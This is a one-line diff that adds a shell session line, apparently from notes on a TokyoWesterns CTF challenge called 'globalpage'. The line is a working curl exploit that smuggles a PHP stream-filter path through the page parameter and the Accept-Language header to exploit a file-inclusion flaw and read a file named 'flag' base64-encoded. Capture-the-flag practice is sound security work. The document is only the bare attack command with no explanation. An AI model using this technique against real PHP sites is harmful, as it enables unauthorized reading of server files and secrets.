@@ -1,0 +1,1 @@
+sam@sam-ctf:~/mammon/events/ctf/events/tokyowesterns/ninnth$ curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'Accept-Language:/filter/convert.base64-encode/resource=flag' --compressed
